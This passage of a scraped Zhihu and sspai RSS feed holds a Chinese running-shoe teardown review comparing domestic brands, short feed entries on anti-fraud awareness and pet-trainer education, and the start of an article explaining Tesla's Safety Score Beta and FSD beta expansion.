data-size=\"normal\" data-rawwidth=\"936\" data-rawheight=\"702\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3><b>休闲跑鞋总结：</b></h3>\n<p>对于休闲跑鞋来说，脚感是第一位的，首要强调踩屎感，要求跑鞋要软。在此基础上要有不错的稳定支撑性能以能够满足基础的短距离跑步需求，在此基础上轻量化，透气性，颜值等也是不错的加分项。</p>\n<p>鸿星尔克Flex 3.0虽然有着275g的轻量化表现，邵氏硬度40C的非常软的脚感，但是其仅起装饰作用的稳定小碳板使得跑鞋的稳定支撑性能非常差，不适合跑步时穿，不推荐作为休闲跑鞋；</p>\n<p>匹克态级3.0PRO 44码307g的重量，邵氏硬度39C的踩屎感脚感，并且具有非常不错的稳定支撑性，非常适合街穿以及短距离跑步，是一双非常不错的休闲跑鞋；</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429789408412856320\"></a><h2>二. 长距离慢跑鞋</h2>\n<p>必迈千里，361国际线Spire-R以及李宁越影的参数如下：</p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<td></td>\n<td>必迈千里</td>\n<td>361国际线Spire-R</td>\n<td>李宁越影</td>\n</tr>\n<tr>\n<td>重量（g）</td>\n<td>308g</td>\n<td>311g</td>\n<td>309g</td>\n</tr>\n<tr>\n<td>邵氏硬度</td>\n<td>55C</td>\n<td>46C/58C</td>\n<td>45C</td>\n</tr>\n</tbody></table>\n<h3>1. 缓震回弹表现</h3>\n<p>必迈中底变形gif图，几乎无形变</p>\n<p><img src=\"https://pic4.zhimg.com/v2-29235a4f7e6920f97258bda430fe3d2e_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"413\" data-watermark=\"watermark\" data-original-src=\"v2-29235a4f7e6920f97258bda430fe3d2e\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>361国际线Spire-R中底形变gif图</p>\n<p><img src=\"https://pic2.zhimg.com/v2-567553bb1b9bf1961d7ac900f7abef3c_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"599\" data-rawheight=\"384\" data-watermark=\"watermark\" data-original-src=\"v2-567553bb1b9bf1961d7ac900f7abef3c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>两种密度组成的中底-紫色是361自家的QUIKFOAM中底科技，白色是相对较硬的EVA</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7ee24abc50bc92b26b564c0414a5ab99_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"810\" data-rawheight=\"607\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>李宁越影中底形变gif图，有较大形变</p>\n<p><img src=\"https://pic2.zhimg.com/v2-84c8166382be664644fc05b024dca723_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"599\" data-rawheight=\"392\" data-watermark=\"watermark\" data-original-src=\"v2-84c8166382be664644fc05b024dca723\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>通过中底形变图以及根据硬度测试数据对比：</p>\n<p><b>必迈的千里跑鞋属于非常韧的类型，脚感较硬；</b></p>\n<p><b>361国际线的中底由两种密度的中底组成，紫色的QUICKFOAM硬度相对较低为45C，白色的EVA中底密度调教的较硬为58C，脚感要比千里柔和很多；</b></p>\n<p><b>李宁越影的中底硬度为45C，脚感在3双鞋中为最柔和，穿在脚上也是对于初跑者最为友好；</b></p>\n<h3>2. 稳定支撑表现</h3>\n<ul><li><b>必迈42K千里</b></li></ul>\n<p><b>中足的硬质TPU抗扭片</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dfd6d082c0b73da61a49cec0a73a14a8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"949\" data-rawheight=\"640\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>拆解后发现中底还有一块内置的小碳片</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c04a4276e120d234d74065a724cd622e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"793\" data-rawheight=\"535\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<ul><li><b>361国际线Spire-R</b></li></ul>\n<p><img src=\"https://pic2.zhimg.com/v2-b654e04c8ab63ba11e382f33b93ad0ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1028\" data-rawheight=\"694\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<ul><li>李宁越影</li></ul>\n<p><b>中底同样的硬质TPU抗扭片</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-21fce1578e670d0f0ccdc43f9ae1e3b2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"781\" data-rawheight=\"586\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>越影的中底看着非常厚，给人一种落地不稳的感觉，但是拆解后发现，中底并没有看起来那么厚，通过剖开断面发现越影的侧墙非常高，这种和HOKA ONE ONE的嵌入式鞋床类似的设计，在保证了落地稳定性的同时，也营造了一种极其舒适的脚感，实际跑下来也是特别的舒适</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5852ec876f2008c7db1c3fbf7d1a03f0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"874\" data-rawheight=\"655\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>这种侧墙非常高的设计可以防止落地时的内外翻，起到非常强的保护作用</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-11eecfff91b62915a4ad7e02755d6233_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"696\" data-rawheight=\"850\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了更直观的对比两双跑鞋的实际上脚差异，左脚穿着361国际线的Spire-R，右脚穿必迈42K千里进行了3km的慢跑测试。总结如下：</p>\n<p><b>两双中底硬度不同的跑鞋在路跑对比中，左脚的Spire-R能明显的感受到中底压缩形变缓冲作用，在对比之下右脚的必迈千里几乎感受不到中底的压缩形变过程，左右脚脚感的明显差异也让路跑非常不适应。</b></p>\n<p><b>必迈千里需要跑者具有一定的跑步基础和脚踝力量才能驾驭，而Spire-R更柔软的脚感则明显更占优一些。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9039643f05ee0d3217ab6d772c41bfc3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"754\" data-rawheight=\"754\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3>长距离慢跑鞋总结：</h3>\n<p>对于用于LSD（长距离慢跑）的慢跑鞋，除了需要充足的缓震和保护性以外，后半程不会卸力是一个非常重要的指标。这就要求跑鞋的硬度不能太软也不能太硬，太软会导致越跑越累，太硬又会容易缓震不够对膝盖造成伤害，厂家对于中底调教的功力在这里尤为重要。</p>\n<p>必迈42K千里，361国际线Spire-R以及李宁越影三者重量几乎相同，在脚感上千里最韧，越影最软，Spire-R居其中。实际跑下来10km以上的长距离表现都非常优异，不会出现后半程卸力的问题。</p>\n<p><b>必迈42K千里对于跑者自身的肌力要求较高，不建议初跑者入手；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429789786891038721\"></a><p><b>361国际线的Spire-R居于两者之间，有一定跑步基础的跑者都可以轻松驾驭；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429790018802335744\"></a><p><b>李宁越影柔软舒适的脚感是让初跑者也可以轻松驾驭的跑鞋，应该是三种长距离跑鞋中对跑者自身水平要求最低的跑鞋；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429790749106188289\"></a><h2>三. 大体重跑鞋</h2>\n<p>这里的大体重跑鞋并不是指只有大体重才可以穿的跑鞋，而是指大体重穿会更合适。因为大体重跑鞋在缓震足够的前提下普遍重量相对较重（单只重量一般超过300g，甚至达到400g），中小体重有更轻量化的选择，比如上面说的三双。</p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<td></td>\n<td>安踏创1.5</td>\n<td>多威反重力</td>\n<td>特步动力巢</td>\n</tr>\n<tr>\n<td>重量（g）</td>\n<td>350g</td>\n<td>398g</td>\n<td>393g</td>\n</tr>\n<tr>\n<td>邵氏硬度</td>\n<td>45C</td>\n<td>45C/58C</td>\n<td>42C</td>\n</tr>\n</tbody></table>\n<h3>1. 缓震回弹表现</h3>\n<p>安踏创1.5中底压缩变形gif图</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3e54bf4f0372e06eb58b7518c84099c4_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"381\" data-watermark=\"watermark\" data-original-src=\"v2-3e54bf4f0372e06eb58b7518c84099c4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>多威反重力中底压缩变形gif图</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5a70ee6d36dfa7ca85ee41ce3da900a6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"599\" data-rawheight=\"366\" data-watermark=\"watermark\" data-original-src=\"v2-5a70ee6d36dfa7ca85ee41ce3da900a6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>多威反重力跑鞋后跟处有另一种硬度较软的中底材料，可以为后跟跑法的初跑者提供更柔软的脚感</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-181458bebfff8dcc4c87f8f0c082087b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"971\" data-rawheight=\"728\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>特步动力巢中底压缩变形gif图</p>\n<p><img src=\"https://pic1.zhimg.com/v2-de2c63af70c9e622eaddd97e12c08287_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"412\" data-watermark=\"watermark\" data-original-src=\"v2-de2c63af70c9e622eaddd97e12c08287\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>对三双跑鞋的中底形变gif图以及实际路跑测试对比：</p>\n<p><b>创1.5</b>的脚感介于三者中间，实际路跑测试10km，72kg的体重跑下来远远没有达到缓震极限。而且改进了创1.0第一代的前掌缓震不足的问题，脚感也相对多威反重力更柔和一些；</p>\n<p><b>多威反重力</b>跑鞋的中底硬度较高，路跑过程中也几乎感觉不到中底的压缩变形，但是并不代表没有缓震，而是给人一种很韧的感觉，我是前掌跑法，后跟跑法的初跑者缓震感会更强一些，缓震极限要远超另外两双，长距离跑是它相对其他两双的优势；</p>\n<p><b>特步动力巢</b>是三双中踩屎感最强的跑鞋，脚感类似阿迪达斯的Boost，过于柔软的脚感也是三双中最不适合跑长距离的跑鞋，5km以上建议穿另外两双，但是街穿会非常舒服；</p>\n<h3>2. 稳定支撑表现</h3>\n<p>安踏创1.5中足的耐磨橡胶起到类似的抗扭作用</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8c91bd135126615d9b3c13ac1ef1327f_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2135\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-8c91bd135126615d9b3c13ac1ef1327f\" data-watermark-src=\"v2-6ca01fef83500362fc628a5dde6ca240\" data-private-watermark-src=\"v2-f665ac63bc82d1860e3c95a58f988271\"></p>\n<p>两侧的TPU从后跟延伸到中足起到防侧翻作用</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5967b06375b01adf096f3f1a213f6270_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"946\" data-rawheight=\"710\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>多威反重力内置一块X形小碳板起到抗扭转作用-拆解图</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d9aaa774096827c0e26d02ca40956b3c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"836\" data-rawheight=\"627\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>从后跟延伸到中足的内置硬质TPU片起到防侧翻作用</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c96e5c0a019a47c457e908fdf2828376_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"912\" data-rawheight=\"684\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>特步动力巢中足的连续耐磨橡胶起到类似的抗扭转作用</p>\n<p><img src=\"https://pic4.zhimg.com/v2-46650f9d4c74f3a15f9201f099c507b6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"862\" data-rawheight=\"647\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>同样从后跟延伸的中足的外置黑色硬质TPU片起到防侧翻作用</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7bf00aaa254261c66c3dc145c1b635fc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"914\" data-rawheight=\"686\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>作为大体重跑者的跑鞋，三双均有不错的稳定支撑表现。</b></p>\n<p>同时为了更直观的进行对比实际上脚差异，左脚穿多威反重力，右脚穿特步动力巢进行了2km的路跑测试。总结如下：</p>\n<p>从刚开始跑的第一步几乎就感受到了两双跑鞋的巨大差异，右脚的动力巢每一步都能感受到中底材料的压缩变形，而左脚的反重力几乎感受不到变形的存在，好像左脚在赤脚跑一样，很明显动力巢在追求踩屎感。<b>——如果只是在鞋店走路试穿的话，我可能会毫不犹豫的选择动力巢。</b></p>\n<p><b>随着跑步的继续，由于右脚动力巢的压缩形变行程非常长，而且因为回弹不明显，所以触地时间也会变长，有些许卸力；</b></p>\n<p><b>此时左脚的反重力跑鞋虽然没有脚踩棉花一样的柔软脚感，但是还是能感受到那种比较韧的缓震，越往后跑会越舒服；</b></p>\n<p>因为两只脚的脚感差异实在是太大，所以只跑了2km。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fbb0681eec8686fa72fb6a92cc2fa88d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"857\" data-rawheight=\"857\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3>大体重跑鞋总结：</h3>\n<p>选购大体重跑鞋时首要的永远是充足的缓震，在缓震充足的前提下再考虑重量耐磨等等因素。</p>\n<p><b>安踏创1.5 44码350g的重量，脚感介于反重力和动力巢之间，缓震极限上比反重力和动力巢弱一些，但是也足够了。对于大体重有一定跑步基础的跑者，这会是一双相对轻量的高性价比选择；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429792259554717696\"></a><p><b>多威反重力44码398g的重量，脚感虽然在三双中最硬，可是其优异的长距离表现，绵韧的脚感，让大体重跑者可以放心的慢跑，长距离也可以驾驭；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429792415486525440\"></a><p><b>特步动力巢44码393g的重量，有着最柔软的脚感，是三双中最不适合长距离的跑鞋，最适合大体重跑者休闲跑的跑鞋；</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429793042647289856\"></a><h2><b>拆解测评为什么要一直做下去</b></h2>\n<p>本次从前期调研采买，参数测试，路跑测试，再到拆解测评，左右脚不同型号跑鞋对比测评，一双跑鞋的选购要经历太多太多坑。</p>\n<p>虽然之前也一直在做国产跑鞋的测评，但是这次这么大规模的一次性8双一起测评还是第一次。也可以看到国产跑鞋一直在进步，从最开始的初级产品匹克态极1.0到如今成熟的态极3.0；从前掌缓震太弱的安踏创1.0到现在轻松跑10km的安踏创1.5。虽然现在和国外品牌还有一定的差距，但是这个差距在不断缩小，也希望国产品牌能够保持初心，继续一如既往的把精力放在提升产品力上，而不是去把精力花在如何忽悠消费者以及博眼球上。</p>\n<p>而对于自己拆解测评的意义，也在这次测评之后找到了答案：</p>\n<p><b>在拆解过程中发现了碳板营销噱头</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8048caf4cc836ad6f339b6e0aa148b67_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"843\" data-rawheight=\"569\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>在拆解过程中发现了高侧墙的巧妙设计</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3743d6f180ab9bd7c8b8513ece6fc274_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"782\" data-rawheight=\"919\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>而左右脚穿不同跑鞋对比测评的脚感差异如此之明显则是意外的惊喜：</b></p>\n<b></b><p><img src=\"https://pic2.zhimg.com/v2-dd8674e91da0e0a8796405bbf3307319_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"808\" data-rawheight=\"808\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>一直在探索如何才能更全面的测评一款甚至多款跑鞋，如何能更直观的展现不同跑鞋的区别，为跑友提供更直观更准确的跑鞋选购参考。</b></p>\n<p><b>现在也找到了答案：</b></p>\n<p><b>拆——跑鞋拆解会一直做下去，让隐藏在内部的缺陷无处遁形，也让好的设计被更多人知道</b></p>\n<p><b>跑——左右脚不同跑鞋对比路跑测评也会一直做下去，后面会在保证安全的前提下增加单次跑步的里程数，提供更精准的对比</b></p>\n<p>也感谢知乎跑友们一直以来的支持，让我们一起跑下去，我也会一直测下去</p>\n<p>以上 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/97df7cdff4aba088348f297560c591a2\" data-hash=\"97df7cdff4aba088348f297560c591a2\" data-hovercard=\"p$b$97df7cdff4aba088348f297560c591a2\">@Seeker</a> </p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tan-suo-19?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Seeker</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/55577787/answer/1599673325?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">44 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/451401343?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些400元左右跑鞋值得入手？</a><br><a href=\"http://www.zhihu.com/question/317600151?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有什么脚感好，还挺好看的跑鞋？</a><br>\n","link":"http://www.zhihu.com/question/55577787/answer/1599673325?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"为什么反诈这么难？","date":"2021-10-08 04:04:16","description":"假期第五天，反诈不打烊！上一期说到了电信网络诈骗的特点，这一期来和大家聊聊关于“诈骗套路”的那些事。想知道骗子是如何行骗的吗？咱们又该如何提高警惕呢？为大家送上“反诈宝典”，请注意查收！\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-san-nong-fa-bu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国三农发布</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480359619/answer/2156264041?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">65 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/422987372?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待2020年电信诈骗呈井喷式增长，甚至还有一些警察被骗，全国人民无时无刻不在承受着骗子的骚扰。？</a><br><a href=\"http://www.zhihu.com/question/442354509?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么遇到诈骗 ，诈骗人伏法了，但人民追不回损失？</a><br>\n","link":"http://www.zhihu.com/question/480359619/answer/2156264041?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"怎么看待中国市场上的宠物训练及训练师培训？","date":"2021-10-08 04:03:40","description":"这几年，职业教育越来越受到大家关注，目前我国共有职业学校1.13万所，在校生3088万人。随着社会的多元化发展，出现了很多新兴职业，而职业教育也提档升级，开设了更多适应现在社会生活需要的专业。最近宠物养护专业挺火，全国目前大约有20所职业学校都开办了相关的专业课程。我们的职教“体验官”就带您去看看这个专业都学些啥？\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-san-nong-fa-bu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国三农发布</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/66395101/answer/2157881360?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/38158495?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">新人想走训犬这条路应该怎样入行和有哪些注意事项？</a><br><a href=\"http://www.zhihu.com/question/311294737?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">哪里可以找到顶尖的训犬师？</a><br>\n","link":"http://www.zhihu.com/question/66395101/answer/2157881360?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"靠「安全评分」进军汽车保险？特斯拉要反过来教司机开车","date":"2021-10-08 03:30:03","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>9 月 25 日，特斯拉在美国本土同时推送 Tesla OS v2021.32.22 和特斯拉 App v4.1 版本更新，<strong>更新了「FSD 完全自动驾驶 Beta 版申请按钮」和「安全评分 Beta 版」两个功能。</strong>基于这两个功能，特斯拉在数据驱动业务的维度向前跨越了一大步。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/0b08760a6dbe9bb6ea1d8e60f2bf08c1\" alt=\"图片\"></figure><p><br>简单来说，美国地区选装了 FSD 的特斯拉车主可以在系统更新至 2020.32.22 后点击「申请完全自动驾驶能力 Beta 版」，系统内置的「特斯拉保险计算器」会运行「安全评分 Beta 版」，<strong>待系统连续 7 天认定驾驶员驾驶习惯安全可靠后，该车即可收到 FSD Beta 的推送更新。 </strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/d632250b914cdfeb6b0dc2facb4a56f7\" alt=\"图片\"></figure><p><br>从 FSD 的全栈算法、公测用户的运营扩张乃至衍生的特斯拉 UBI（Usage-based insurance）车险，这一整个闭环的业务，<strong>特斯拉全部转向了基于数据驱动的机器学习。由此，特斯拉开启了全面升维的竞争。 </strong></p>\n<h2>安全评分 Beta 版</h2>\n<p>之所以将「安全评分 Beta 版」放在开头介绍，是因为无论是「FSD 完全自动驾驶 Beta 版申请按钮」还是「特斯拉保险」，都是以「安全评分」为根基的业务。那么，什么是「安全评分」？ </p>\n<p>据特斯拉的介绍：</p>\n<blockquote>\n<p>「安全评分」根据 5 个与安全相关的指标对特斯拉车主的驾驶行为进行评估，特斯拉将基于这些数据预测当事车主的驾驶习惯在未来驾驶车辆发生碰撞的可能性。</p>\n<p>「安全评分」的目的是为驾驶员提供透明度和对其驾驶行为的反馈。「安全评分」介于 0 和100 之间，分数越高表明驾驶越安全，<strong>特斯拉认为绝大多数司机的评分应当 ≥ 80 分。</strong></p>\n</blockquote>\n<p>那 5 个「安全相关的指标」分别是什么呢？驾驶员对车辆的操作控制无外乎横向和纵向控制两大维度，其中横向控制主要通过往左右打方向盘来实现，纵向控制通过加速和制动踏板实现。特斯拉「安全评分」的 5 个指标也逃不出这三大执行操作：</p>\n<p><strong>每千英里前方碰撞预警触发率</strong>（下记为 A），一个冗长但并不难理解的名词，每驾驶 1000 英里，驾驶员未介入而特斯拉 Autopilot 系统认为可能发生碰撞，从而触发「前方碰撞预警」的次数。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/a144fc5e0750d5e02661767de2c343de\" alt=\"图片\"></figure><p><br><strong>急刹车</strong>（下记为 B） ，一个比值。特斯拉的定义是在驾驶行程中，刹车减速度超过 0.3 g（相当每过一秒钟车速下降超过 6.7 mph 即 10.78 km/h），除以刹车减速度超过 0.1 g（相当于每过一秒钟车速下降超过 2.2 mph 即 3.54 km/h）的比值。 </p>\n<p><strong>猛转向</strong>（下记为 C），同样是一个比值。特斯拉的定义是在驾驶行程中，车辆左/右加速度超过 0.4 g（相当于每过一秒钟车辆向左/右的速度增加超过 8.9 mph 即 14.32 km/h），除以车辆左/右加速度超过 0.2 g（相当于每过一秒钟车辆向左/右的速度增加超过 4.5 mph 即 7.24km/h）的比值。 </p>\n<p><strong>不安全跟车</strong>（下记为 D），D 是一个动态值。Autopilot 根据本车速度、前车速度和两车间的距离判断。计算方法为当前车突然刹停，驾驶员做出反应并刹停所需的时间长度。D 的定义为反应时间低于 1 秒除以反应时间低于 3 秒的比值。此外，D 只有车速在 50 mph（80.47 km/h）才会被记录。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/c5aae552c5c812c73aa44de92a170f2f\" alt=\"图片\"></figure><p><strong>强制退出 Autopilot</strong>（下记为 E），特斯拉车主都知道，Autopilot 会在连续警告三次均得不到驾驶员的响应后退出，当驾驶员双手脱离方向盘或分心驾驶后，系统将发出警告。E 的定义是 5 个指标中最为简单的一个：如果驾驶行程中 Autopilot 出现强制退出，记为 1，否则记 0。 特斯拉有一个 PCF（Predicted Collision Frequency，预测碰撞频率）计算公式，将上述 A、B、C、D、E 五个数值计入如下公式，即可得出 PCF 值。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/6c433eafcd330789b7dadf6b367d4c87\" alt=\"图片\"></figure><blockquote><p><br>安全评分 = 115.382324 - 22.526504 × PCF </p></blockquote>\n<p>你一定想问，这 8 个精确到小数点后 6 位的数都是怎么来的。特斯拉表示，<strong>当前公式都是基于 60 亿英里车队数据的统计模型得出的。</strong> </p>\n<p>到这里，其实你已经能看出，这个「安全评分」并不简单。基于已有的 60 亿英里车队数据，准确地分辨出哪些车主的驾驶习惯良好，听上去就不是个轻松的事情，事实上，从首批车主的体验反馈看，连特斯拉也低估了 Ta 的难度。 </p>\n<h2>FSD 内测规模如何有序扩张</h2>\n<p>自 2020 年 10 月 21 日特斯拉首次公测 FSD Beta 至今，围绕特斯拉 FSD 一个相当广泛的质疑是，<strong>FSD Beta 公测的车队规模一直保持在 2000 辆上下。</strong>没有进入美国更多的州，也没运行在更多的 FSD 车型上。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/7a73873e93befc0d40184f897076b672\" alt=\"图片\"></figure><p>这和大众对特斯拉 FSD 的预期相去甚远，世界不需要另一个可扩展性严重受限的自动驾驶系统。过去 5 年来，Waymo、Cruise 们都没能带给我们惊喜，<strong>而特斯拉几乎是唯一一家直到 2021 年仍然「逢自动驾驶必谈 Scalability」的主流自动驾驶玩家。</strong></p>\n<p>但在质疑背后，特斯拉一直在以近乎疯狂的效率迭代着 FSD Beta 的全栈算法，不夸张地说，<strong>从 2020 年 10 月至今，超 20 